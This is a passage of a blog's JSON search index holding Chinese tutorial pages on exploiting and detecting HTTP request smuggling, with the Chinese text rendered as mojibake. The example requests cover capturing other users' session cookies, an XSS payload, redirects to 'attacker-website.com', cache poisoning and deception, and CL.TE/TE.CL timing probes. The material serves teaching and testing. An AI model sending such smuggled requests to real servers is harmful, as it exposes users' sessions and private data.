å¤´çš„å€¼å°†å†³å®šåç«¯æœåŠ¡å™¨å¤„ç†è¯·æ±‚çš„æ—¶é—´ã€‚å¦‚æœå°†æ­¤å€¼è®¾ç½®å¾—å¤ªçŸ­ï¼Œåˆ™åªä¼šæ”¶åˆ°éƒ¨åˆ†é‡å†™è¯·æ±‚ï¼›å¦‚æœè®¾ç½®å¾—å¤ªé•¿ï¼Œåç«¯æœåŠ¡å™¨å°†ä¼šç­‰å¾…è¶…æ—¶ã€‚å½“ç„¶ï¼Œè§£å†³æ–¹æ¡ˆæ˜¯çŒœæµ‹ä¸€ä¸ªæ¯”æäº¤çš„è¯·æ±‚ç¨å¤§ä¸€ç‚¹çš„åˆå§‹å€¼ï¼Œç„¶åé€æ¸å¢å¤§è¯¥å€¼ä»¥æ£€ç´¢æ›´å¤šä¿¡æ¯ï¼Œç›´åˆ°è·å¾—æ„Ÿå…´è¶£çš„æ‰€æœ‰å†…å®¹ã€‚ ä¸€æ—¦äº†è§£äº†è½¬å‘æœåŠ¡å™¨å¦‚ä½•é‡å†™è¯·æ±‚ï¼Œå°±å¯ä»¥å¯¹èµ°ç§çš„è¯·æ±‚è¿›è¡Œå¿…è¦çš„è°ƒæ•´ï¼Œä»¥ç¡®ä¿åç«¯æœåŠ¡å™¨ä»¥é¢„æœŸçš„æ–¹å¼å¯¹å…¶è¿›è¡Œå¤„ç†ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/exploiting-request-smuggling/:2:0","tags":[],"title":"Exploiting request smuggling","uri":"/translation/web-security/request-smuggling/exploiting-request-smuggling/"},{"categories":["web security"],"content":"æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚ å¦‚æœåº”ç”¨ç¨‹åºåŒ…å«å­˜å‚¨å’Œæ£€ç´¢æ–‡æœ¬æ•°æ®çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§å»æ•è·å…¶ä»–ç”¨æˆ·è¯·æ±‚çš„å†…å®¹ã€‚è¿™äº›å†…å®¹å¯èƒ½åŒ…æ‹¬ä¼šè¯ä»¤ç‰Œï¼ˆæ•è·åå¯ä»¥è¿›è¡Œä¼šè¯åŠ«æŒæ”»å‡»ï¼‰ï¼Œæˆ–å…¶ä»–ç”¨æˆ·æäº¤çš„æ•æ„Ÿæ•°æ®ã€‚è¢«æ”»å‡»çš„åŠŸèƒ½é€šå¸¸æœ‰è¯„è®ºã€ç”µå­é‚®ä»¶ã€ä¸ªäººèµ„æ–™ã€æ˜¾ç¤ºæ˜µç§°ç­‰ç­‰ã€‚ è¦è¿›è¡Œæ”»å‡»ï¼Œæ‚¨éœ€è¦èµ°ç§ä¸€ä¸ªå°†æ•°æ®æäº¤åˆ°å­˜å‚¨åŠŸèƒ½çš„è¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«è¯¥æ•°æ®çš„å‚æ•°ä½äºè¯·æ±‚çš„æœ€åã€‚åç«¯æœåŠ¡å™¨å¤„ç†çš„ä¸‹ä¸€ä¸ªè¯·æ±‚å°†è¿½åŠ åˆ°èµ°ç§è¯·æ±‚åï¼Œç»“æœå°†å­˜å‚¨å¦ä¸€ä¸ªç”¨æˆ·çš„åŸå§‹è¯·æ±‚ã€‚ å‡è®¾æŸä¸ªåº”ç”¨ç¨‹åºé€šè¿‡å¦‚ä¸‹è¯·æ±‚æäº¤åšå®¢å¸–å­è¯„è®ºï¼Œè¯¥è¯„è®ºå°†å­˜å‚¨å¹¶æ˜¾ç¤ºåœ¨åšå®¢ä¸Šï¼š POST /post/comment HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 154 Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0\u0026postId=2\u0026comment=My+comment\u0026name=Carlos+Montoya\u0026email=carlos%40normal-user.net\u0026website=https%3A%2F%2Fnormal-user.net ä½ å¯ä»¥æ‰§è¡Œä»¥ä¸‹è¯·æ±‚èµ°ç§æ”»å‡»ï¼Œç›®çš„æ˜¯è®©åç«¯æœåŠ¡å™¨å°†ä¸‹ä¸€ä¸ªç”¨æˆ·è¯·æ±‚å½“ä½œè¯„è®ºå†…å®¹è¿›è¡Œå­˜å‚¨å¹¶å±•ç¤ºï¼š GET / HTTP/1.1 Host: vulnerable-website.com Transfer-Encoding: chunked Content-Length: 324 0 POST /post/comment HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 400 Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0\u0026postId=2\u0026name=Carlos+Montoya\u0026email=carlos%40normal-user.net\u0026website=https%3A%2F%2Fnormal-user.net\u0026comment= å½“ä¸‹ä¸€ä¸ªç”¨æˆ·è¯·æ±‚è¢«åç«¯æœåŠ¡å™¨å¤„ç†æ—¶ï¼Œå®ƒå°†è¢«é™„åŠ åˆ°èµ°ç§çš„è¯·æ±‚åï¼Œç»“æœå°±æ˜¯ç”¨æˆ·çš„è¯·æ±‚ï¼ŒåŒ…æ‹¬ä¼šè¯ cookie å’Œå…¶ä»–æ•æ„Ÿä¿¡æ¯ä¼šè¢«å½“ä½œè¯„è®ºå†…å®¹å¤„ç†ï¼š POST /post/comment HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 400 Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0\u0026postId=2\u0026name=Carlos+Montoya\u0026email=carlos%40normal-user.net\u0026website=https%3A%2F%2Fnormal-user.net\u0026comment=GET / HTTP/1.1 Host: vulnerable-website.com Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj ... æœ€åï¼Œç›´æ¥é€šè¿‡æ­£å¸¸çš„æŸ¥çœ‹è¯„è®ºçš„æ–¹å¼å°±èƒ½çœ‹åˆ°å…¶ä»–ç”¨æˆ·è¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯äº†ã€‚ æ³¨æ„ï¼šè¿™ç§æŠ€æœ¯çš„å±€é™æ€§æ˜¯ï¼Œå®ƒé€šå¸¸åªä¼šæ•è·ä¸€ç›´åˆ°èµ°ç§è¯·æ±‚è¾¹ç•Œç¬¦çš„æ•°æ®ã€‚å¯¹äº URL ç¼–ç çš„è¡¨å•æäº¤ï¼Œå…¶æ˜¯ \u0026 å­—ç¬¦ï¼Œè¿™æ„å‘³ç€å­˜å‚¨çš„å—å®³ç”¨æˆ·çš„è¯·æ±‚æ˜¯ç›´åˆ°ç¬¬ä¸€ä¸ª \u0026 ä¹‹é—´çš„å†…å®¹ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/exploiting-request-smuggling/:3:0","tags":[],"title":"Exploiting request smuggling","uri":"/translation/web-security/request-smuggling/exploiting-request-smuggling/"},{"categories":["web security"],"content":"ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§è¿›è¡Œåå°„å‹ XSS æ”»å‡» å¦‚æœåº”ç”¨ç¨‹åºæ—¢å­˜åœ¨ HTTP è¯·æ±‚èµ°ç§æ¼æ´ï¼Œåˆå­˜åœ¨åå°„å‹ XSS æ¼æ´ï¼Œé‚£ä¹ˆä½ å¯ä»¥ä½¿ç”¨è¯·æ±‚èµ°ç§æ”»å‡»åº”ç”¨ç¨‹åºçš„å…¶ä»–ç”¨æˆ·ã€‚è¿™ç§æ–¹æ³•åœ¨ä¸¤ä¸ªæ–¹é¢ä¼˜äºä¸€èˆ¬çš„åå°„å‹ XSS æ”»å‡»æ–¹å¼ï¼š å®ƒä¸éœ€è¦ä¸å—å®³ç”¨æˆ·äº¤äº’ã€‚ä½ ä¸éœ€è¦ç»™å—å®³ç”¨æˆ·å‘é€ä¸€ä¸ªé’“é±¼é“¾æ¥ï¼Œç„¶åç­‰å¾…ä»–ä»¬è®¿é—®ã€‚ä½ åªéœ€è¦èµ°ç§ä¸€ä¸ªåŒ…å« XSS æœ‰æ•ˆè´Ÿè½½çš„è¯·æ±‚ï¼Œç”±åç«¯æœåŠ¡å™¨å¤„ç†çš„ä¸‹ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚å°±ä¼šå‘½ä¸­ã€‚ å®ƒå¯ä»¥åœ¨è¯·æ±‚çš„æŸäº›éƒ¨åˆ†ï¼ˆå¦‚ HTTP è¯·æ±‚å¤´ï¼‰ä¸­åˆ©ç”¨ XSS æ”»å‡»ï¼Œè€Œè¿™åœ¨æ­£å¸¸çš„åå°„å‹ XSS æ”»å‡»ä¸­æ— æ³•è½»æ˜“æ§åˆ¶ã€‚ å‡è®¾æŸä¸ªåº”ç”¨ç¨‹åºåœ¨ User-Agent å¤´ä¸Šå­˜åœ¨åå°„å‹ XSS æ¼æ´ï¼Œé‚£ä¹ˆä½ å¯ä»¥é€šè¿‡å¦‚ä¸‹æ‰€ç¤ºçš„è¯·æ±‚èµ°ç§åˆ©ç”¨æ­¤æ¼æ´ï¼š POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 63 Transfer-Encoding: chunked 0 GET / HTTP/1.1 User-Agent: \u003cscript\u003ealert(1)\u003c/script\u003e Foo: X æ­¤æ—¶ï¼Œä¸‹ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚å°†è¢«é™„åŠ åˆ°èµ°ç§çš„è¯·æ±‚åï¼Œä¸”ä»–ä»¬å°†åœ¨å“åº”ä¸­æ¥æ”¶åˆ°åå°„å‹ XSS çš„æœ‰æ•ˆè´Ÿè½½ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/exploiting-request-smuggling/:4:0","tags":[],"title":"Exploiting request smuggling","uri":"/translation/web-security/request-smuggling/exploiting-request-smuggling/"},{"categories":["web security"],"content":"åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§å°†ç«™å†…é‡å®šå‘è½¬æ¢ä¸ºå¼€æ”¾é‡å®šå‘ è®¸å¤šåº”ç”¨ç¨‹åºæ ¹æ®è¯·æ±‚çš„ HOST å¤´è¿›è¡Œç«™å†… URL çš„é‡å®šå‘ã€‚ä¸€ä¸ªç¤ºä¾‹æ˜¯ Apache å’Œ IIS Web æœåŠ¡å™¨çš„é»˜è®¤è¡Œä¸ºï¼Œå…¶ä¸­å¯¹ä¸å¸¦æ–œæ çš„ç›®å½•çš„è¯·æ±‚å°†é‡å®šå‘åˆ°å¸¦æ–œæ çš„åŒä¸€ä¸ªç›®å½•ï¼š GET /home HTTP/1.1 Host: normal-website.com HTTP/1.1 301 Moved Permanently Location: https://normal-website.com/home/ é€šå¸¸ï¼Œæ­¤è¡Œä¸ºè¢«è®¤ä¸ºæ˜¯æ— å®³çš„ï¼Œä½†æ˜¯å¯ä»¥åœ¨è¯·æ±‚èµ°ç§æ”»å‡»ä¸­åˆ©ç”¨å®ƒæ¥å°†å…¶ä»–ç”¨æˆ·é‡å®šå‘åˆ°å¤–éƒ¨åŸŸã€‚ä¾‹å¦‚ï¼š POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 54 Transfer-Encoding: chunked 0 GET /home HTTP/1.1 Host: attacker-website.com Foo: X èµ°ç§è¯·æ±‚å°†ä¼šè§¦å‘ä¸€ä¸ªåˆ°æ”»å‡»è€…ç«™ç‚¹çš„é‡å®šå‘ï¼Œè¿™å°†å½±å“åˆ°åç«¯æœåŠ¡å¤„ç†çš„ä¸‹ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚ï¼Œä¾‹å¦‚ï¼š GET /home HTTP/1.1 Host: attacker-website.com Foo: XGET /scripts/include.js HTTP/1.1 Host: vulnerable-website.com HTTP/1.1 301 Moved Permanently Location: https://attacker-website.com/home/ æ­¤æ—¶ï¼Œå¦‚æœç”¨æˆ·è¯·æ±‚çš„æ˜¯ä¸€ä¸ªåœ¨ web ç«™ç‚¹å¯¼å…¥çš„ JavaScript æ–‡ä»¶ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨å“åº”ä¸­è¿”å›è‡ªå·±çš„ JavaScript æ¥å®Œå…¨æ§åˆ¶å—å®³ç”¨æˆ·ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/exploiting-request-smuggling/:5:0","tags":[],"title":"Exploiting request smuggling","uri":"/translation/web-security/request-smuggling/exploiting-request-smuggling/"},{"categories":["web security"],"content":"åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§è¿›è¡Œ web cache poisoning ä¸Šè¿°æ”»å‡»çš„ä¸€ä¸ªå˜ä½“å°±æ˜¯åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§å»è¿›è¡Œ web cache æŠ•æ¯’ã€‚å¦‚æœå‰ç«¯åŸºç¡€æ¶æ„ä¸­çš„ä»»ä½•éƒ¨åˆ†ä½¿ç”¨ cache ç¼“å­˜ï¼Œé‚£ä¹ˆå¯èƒ½ä½¿ç”¨ç«™å¤–é‡å®šå‘å“åº”æ¥ç ´åç¼“å­˜ã€‚è¿™ç§æ”»å‡»çš„æ•ˆæœå°†ä¼šæŒç»­å­˜åœ¨ï¼Œéšåå¯¹å—æ±¡æŸ“çš„ URL å‘èµ·è¯·æ±‚çš„æ‰€æœ‰ç”¨æˆ·éƒ½ä¼šä¸­æ‹›ã€‚ åœ¨è¿™ç§å˜ä½“æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å‘é€ä»¥ä¸‹å†…å®¹åˆ°å‰ç«¯æœåŠ¡å™¨ï¼š POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 59 Transfer-Encoding: chunked 0 GET /home HTTP/1.1 Host: attacker-website.com Foo: XGET /static/include.js HTTP/1.1 Host: vulnerable-website.com åç«¯æœåŠ¡å™¨åƒä¹‹å‰ä¸€æ ·è¿›è¡Œç«™å¤–é‡å®šå‘å¯¹èµ°ç§è¯·æ±‚è¿›è¡Œå“åº”ã€‚å‰ç«¯æœåŠ¡å™¨è®¤ä¸ºæ˜¯ç¬¬äºŒä¸ªè¯·æ±‚çš„ URL çš„å“åº”ï¼Œç„¶åè¿›è¡Œç¼“å­˜ï¼š /static/include.js: GET /static/include.js HTTP/1.1 Host: vulnerable-website.com HTTP/1.1 301 Moved Permanently Location: https://attacker-website.com/home/ ä»æ­¤åˆ»å¼€å§‹ï¼Œå½“å…¶ä»–ç”¨æˆ·è¯·æ±‚æ­¤ URL æ—¶ï¼Œä»–ä»¬éƒ½ä¼šæ”¶åˆ°æŒ‡å‘æ”»å‡»è€…ç½‘ç«™çš„é‡å®šå‘ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/exploiting-request-smuggling/:6:0","tags":[],"title":"Exploiting request smuggling","uri":"/translation/web-security/request-smuggling/exploiting-request-smuggling/"},{"categories":["web security"],"content":"åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§è¿›è¡Œ web cache poisoning å¦ä¸€ç§æ”»å‡»å˜ä½“å°±æ˜¯åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§å»è¿›è¡Œ web cache æ¬ºéª—ã€‚è¿™ä¸ web cache æŠ•æ¯’çš„æ–¹å¼ç±»ä¼¼ï¼Œä½†ç›®çš„ä¸åŒã€‚ web cache poisoningï¼ˆç¼“å­˜ä¸­æ¯’ï¼‰ å’Œ web cache deceptionï¼ˆç¼“å­˜æ¬ºéª—ï¼‰ æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ å¯¹äº web cache poisoningï¼ˆç¼“å­˜ä¸­æ¯’ï¼‰ï¼Œæ”»å‡»è€…ä¼šä½¿åº”ç”¨ç¨‹åºåœ¨ç¼“å­˜ä¸­å­˜å‚¨ä¸€äº›æ¶æ„å†…å®¹ï¼Œè¿™äº›å†…å®¹å°†ä»ç¼“å­˜æä¾›ç»™å…¶ä»–ç”¨æˆ·ã€‚ å¯¹äº web cache deceptionï¼ˆç¼“å­˜æ¬ºéª—ï¼‰ï¼Œæ”»å‡»è€…ä½¿åº”ç”¨ç¨‹åºåœ¨ç¼“å­˜ä¸­å­˜å‚¨å±äºå¦ä¸€ä¸ªç”¨æˆ·çš„æŸäº›æ•æ„Ÿå†…å®¹ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢è¿™äº›å†…å®¹ã€‚ è¿™ç§æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å‘èµ·ä¸€ä¸ªè¿”å›ç”¨æˆ·ç‰¹å®šæ•æ„Ÿå†…å®¹çš„èµ°ç§è¯·æ±‚ã€‚ä¾‹å¦‚ï¼š POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 43 Transfer-Encoding: chunked 0 GET /private/messages HTTP/1.1 Foo: X æ¥è‡ªå¦ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚è¢«åç«¯æœåŠ¡å™¨è¢«é™„åŠ åˆ°èµ°ç§è¯·æ±‚åï¼ŒåŒ…æ‹¬ä¼šè¯ cookie å’Œå…¶ä»–æ ‡å¤´ã€‚ä¾‹å¦‚ï¼š GET /private/messages HTTP/1.1 Foo: X GET /static/some-image.png HTTP/1.1 Host: vulnerable-website.com Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z ... åç«¯æœåŠ¡å™¨ä»¥æ­£å¸¸æ–¹å¼å“åº”æ­¤è¯·æ±‚ã€‚è¿™ä¸ªè¯·æ±‚æ˜¯ç”¨æ¥è·å–ç”¨æˆ·çš„ç§äººæ¶ˆæ¯çš„ï¼Œä¸”ä¼šåœ¨å—å®³ç”¨æˆ·ä¼šè¯çš„ä¸Šä¸‹æ–‡ä¸­è¢«æ­£å¸¸å¤„ç†ã€‚å‰ç«¯æœåŠ¡å™¨æ ¹æ®ç¬¬äºŒä¸ªè¯·æ±‚ä¸­çš„ URL å³ /static/some-image.png ç¼“å­˜äº†æ­¤å“åº”ï¼š GET /static/some-image.png HTTP/1.1 Host: vulnerable-website.com HTTP/1.1 200 Ok ... \u003ch1\u003eYour private messages\u003c/h1\u003e ... ç„¶åï¼Œæ”»å‡»è€…è®¿é—®é™æ€ URLï¼Œå¹¶æ¥æ”¶ä»ç¼“å­˜è¿”å›çš„æ•æ„Ÿå†…å®¹ã€‚ è¿™é‡Œçš„ä¸€ä¸ªé‡è¦è­¦å‘Šæ˜¯ï¼Œæ”»å‡»è€…ä¸çŸ¥é“æ•æ„Ÿå†…å®¹å°†ä¼šç¼“å­˜åˆ°å“ªä¸ª URL åœ°å€ï¼Œå› ä¸ºè¿™ä¸ª URL åœ°å€æ˜¯å—å®³è€…ç”¨æˆ·åœ¨èµ°ç§è¯·æ±‚ç”Ÿæ•ˆæ—¶æ°å·§ç¢°åˆ°çš„ã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦è·å–å¤§é‡é™æ€ URL æ¥å‘ç°æ•è·çš„å†…å®¹ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/exploiting-request-smuggling/:7:0","tags":[],"title":"Exploiting request smuggling","uri":"/translation/web-security/request-smuggling/exploiting-request-smuggling/"},{"categories":["web security"],"content":"Finding request smuggling","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/finding-request-smuggling/","tags":[],"title":"Finding request smuggling","uri":"/translation/web-security/request-smuggling/finding-request-smuggling/"},{"categories":["web security"],"content":"æŸ¥æ‰¾ HTTP è¯·æ±‚èµ°ç§æ¼æ´ åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»ç”¨äºæŸ¥æ‰¾ HTTP è¯·æ±‚èµ°ç§æ¼æ´çš„ä¸åŒæŠ€æœ¯ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/finding-request-smuggling/:0:0","tags":[],"title":"Finding request smuggling","uri":"/translation/web-security/request-smuggling/finding-request-smuggling/"},{"categories":["web security"],"content":"è®¡æ—¶æŠ€æœ¯ æ£€æµ‹ HTTP è¯·æ±‚èµ°ç§æ¼æ´çš„æœ€æ™®éæœ‰æ•ˆçš„æ–¹æ³•å°±æ˜¯è®¡æ—¶æŠ€æœ¯ã€‚å‘é€è¯·æ±‚ï¼Œå¦‚æœå­˜åœ¨æ¼æ´ï¼Œåˆ™åº”ç”¨ç¨‹åºçš„å“åº”ä¼šå‡ºç°æ—¶é—´å»¶è¿Ÿã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/finding-request-smuggling/:1:0","tags":[],"title":"Finding request smuggling","uri":"/translation/web-security/request-smuggling/finding-request-smuggling/"},{"categories":["web security"],"content":"ä½¿ç”¨è®¡æ—¶æŠ€æœ¯æŸ¥æ‰¾ CL.TE æ¼æ´ å¦‚æœåº”ç”¨å­˜åœ¨ CL.TE æ¼æ´ï¼Œé‚£ä¹ˆå‘é€å¦‚ä¸‹è¯·æ±‚é€šå¸¸ä¼šå¯¼è‡´æ—¶é—´å»¶è¿Ÿï¼š POST / HTTP/1.1 Host: vulnerable-website.com Transfer-Encoding: chunked Content-Length: 4 1 A X å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰ä½¿ç”¨ Content-Length è®¤ä¸ºæ¶ˆæ¯ä½“åªæœ‰ 4 ä¸ªå­—èŠ‚ï¼Œå³ 1\\r\\nAï¼Œå› æ­¤åé¢çš„ X è¢«å¿½ç•¥äº†ï¼Œç„¶åæŠŠè¿™ä¸ªè¯·æ±‚è½¬å‘ç»™åç«¯ã€‚è€Œåç«¯æœåŠ¡ä½¿ç”¨ Transfer-Encoding åˆ™ä¼šä¸€ç›´ç­‰å¾…ç»ˆæ­¢åˆ†å— 0\\r\\n ã€‚è¿™å°±ä¼šå¯¼è‡´æ˜æ˜¾çš„å“åº”å»¶è¿Ÿã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/finding-request-smuggling/:1:1","tags":[],"title":"Finding request smuggling","uri":"/translation/web-security/request-smuggling/finding-request-smuggling/"},{"categories":["web security"],"content":"ä½¿ç”¨è®¡æ—¶æŠ€æœ¯æŸ¥æ‰¾ TE.CL æ¼æ´ å¦‚æœåº”ç”¨å­˜åœ¨ TE.CL æ¼æ´ï¼Œé‚£ä¹ˆå‘é€å¦‚ä¸‹è¯·æ±‚é€šå¸¸ä¼šå¯¼è‡´æ—¶é—´å»¶è¿Ÿï¼š POST / HTTP/1.1 Host: vulnerable-website.com Transfer-Encoding: chunked Content-Length: 6 0 X å‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰ä½¿ç”¨ Transfer-Encodingï¼Œç”±äºç¬¬ä¸€ä¸ªåˆ†å—å°±æ˜¯ 0\\r\\n ç»ˆæ­¢åˆ†å—ï¼Œå› æ­¤åé¢çš„ X ç›´æ¥è¢«å¿½ç•¥äº†ï¼Œç„¶åæŠŠè¿™ä¸ªè¯·æ±‚è½¬å‘ç»™åç«¯ã€‚è€Œåç«¯æœåŠ¡ä½¿ç”¨ Content-Length åˆ™ä¼šä¸€ç›´ç­‰åˆ°åç»­ 6 ä¸ªå­—èŠ‚çš„å†…å®¹ã€‚è¿™å°±ä¼šå¯¼è‡´æ˜æ˜¾çš„å»¶è¿Ÿã€‚ æ³¨æ„ï¼šå¦‚æœåº”ç”¨ç¨‹åºæ˜“å— CL.TE æ¼æ´çš„æ”»å‡»ï¼Œåˆ™åŸºäºæ—¶é—´çš„ TE.CL æ¼æ´æµ‹è¯•å¯èƒ½ä¼šå¹²æ‰°å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚å› æ­¤ï¼Œä¸ºäº†éšè”½å¹¶å°½é‡å‡å°‘å¹²æ‰°ï¼Œä½ åº”è¯¥å…ˆè¿›è¡Œ CL.TE æµ‹è¯•ï¼Œåªæœ‰åœ¨å¤±è´¥äº†ä¹‹åå†è¿›è¡Œ TE.CL æµ‹è¯•ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/finding-request-smuggling/:1:2","tags":[],"title":"Finding request smuggling","uri":"/translation/web-security/request-smuggling/finding-request-smuggling/"},{"categories":["web security"],"content":"ä½¿ç”¨å·®å¼‚å“åº”ç¡®è®¤ HTTP è¯·æ±‚èµ°ç§æ¼æ´ å½“æ£€æµ‹åˆ°å¯èƒ½çš„è¯·æ±‚èµ°ç§æ¼æ´æ—¶ï¼Œå¯ä»¥é€šè¿‡åˆ©ç”¨è¯¥æ¼æ´è§¦å‘åº”ç”¨ç¨‹åºå“åº”å†…å®¹çš„å·®å¼‚æ¥è·å–è¯¥æ¼æ´è¿›ä¸€æ­¥çš„è¯æ®ã€‚è¿™åŒ…æ‹¬è¿ç»­å‘åº”ç”¨ç¨‹åºå‘é€ä¸¤ä¸ªè¯·æ±‚ï¼š ä¸€ä¸ªæ”»å‡»è¯·æ±‚ï¼Œæ—¨åœ¨å¹²æ‰°ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¤„ç†ã€‚ ä¸€ä¸ªæ­£å¸¸è¯·æ±‚ã€‚ å¦‚æœå¯¹æ­£å¸¸è¯·æ±‚çš„å“åº”åŒ…å«é¢„æœŸçš„å¹²æ‰°ï¼Œåˆ™æ¼æ´è¢«ç¡®è®¤ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾æ­£å¸¸è¯·æ±‚å¦‚ä¸‹ï¼š POST /search HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 11 q=smuggling è¿™ä¸ªè¯·æ±‚é€šå¸¸ä¼šæ”¶åˆ°çŠ¶æ€ç ä¸º 200 çš„ HTTP å“åº”ï¼Œå“åº”å†…å®¹åŒ…å«ä¸€äº›æœç´¢ç»“æœã€‚ æ”»å‡»è¯·æ±‚åˆ™å–å†³äºè¯·æ±‚èµ°ç§æ˜¯ CL.TE è¿˜æ˜¯ TE.CL ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/finding-request-smuggling/:2:0","tags":[],"title":"Finding request smuggling","uri":"/translation/web-security/request-smuggling/finding-request-smuggling/"},{"categories":["web security"],"content":"ä½¿ç”¨å·®å¼‚å“åº”ç¡®è®¤ CL.TE æ¼æ´ ä¸ºäº†ç¡®è®¤ CL.TE æ¼æ´ï¼Œä½ å¯ä»¥å‘é€å¦‚ä¸‹æ”»å‡»è¯·æ±‚ï¼š POST /search HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 49 Transfer-Encoding: chunked e q=smuggling\u0026x= 0 GET /404 HTTP/1.1 Foo: x å¦‚æœæ”»å‡»æˆåŠŸï¼Œåˆ™æœ€åä¸¤è¡Œä¼šè¢«åç«¯æœåŠ¡è§†ä¸ºä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å¤´ã€‚è¿™å°†å¯¼è‡´ç´§æ¥ç€çš„ä¸€ä¸ªæ­£å¸¸çš„è¯·æ±‚å˜æˆäº†å¦‚ä¸‹æ‰€ç¤ºï¼š GET /404 HTTP/1.1 Foo: xPOST /search HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 11 q=smuggling ç”±äºè¿™ä¸ªè¯·æ±‚çš„ URL ç°åœ¨æ˜¯ä¸€ä¸ªæ— æ•ˆçš„åœ°å€ï¼Œå› æ­¤æœåŠ¡å™¨å°†ä¼šä½œå‡º 404 çš„å“åº”ï¼Œè¿™è¡¨æ˜æ”»å‡»è¯·æ±‚ç¡®å®äº§ç”Ÿäº†å¹²æ‰°ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/finding-request-smuggling/:2:1","tags":[],"title":"Finding request smuggling","uri":"/translation/web-security/request-smuggling/finding-request-smuggling/"},{"categories":["web security"],"content":"ä½¿ç”¨å·®å¼‚å“åº”ç¡®è®¤ TE.CL æ¼æ´ ä¸ºäº†ç¡®è®¤ TE.CL æ¼æ´ï¼Œä½ å¯ä»¥å‘é€å¦‚ä¸‹æ”»å‡»è¯·æ±‚ï¼š POST /search HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 4 Transfer-Encoding: chunked 7c GET /404 HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 144 x= 0 å¦‚æœæ”»å‡»æˆåŠŸï¼Œåˆ™åç«¯æœåŠ¡å™¨å°†ä» GET / 404 ä»¥åçš„æ‰€æœ‰å†…å®¹éƒ½è§†ä¸ºå±äºæ”¶åˆ°çš„ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚è¿™å°†ä¼šå¯¼è‡´éšåçš„æ­£å¸¸è¯·æ±‚å˜ä¸ºï¼š GET /404 HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 146 x= 0 POST /search HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 11 q=smuggling ç”±äºè¿™ä¸ªè¯·æ±‚çš„ URL ç°åœ¨æ˜¯ä¸€ä¸ªæ— æ•ˆçš„åœ°å€ï¼Œå› æ­¤æœåŠ¡å™¨å°†ä¼šä½œå‡º 404 çš„å“åº”ï¼Œè¿™è¡¨æ˜æ”»å‡»è¯·æ±‚ç¡®å®äº§ç”Ÿäº†å¹²æ‰°ã€‚ 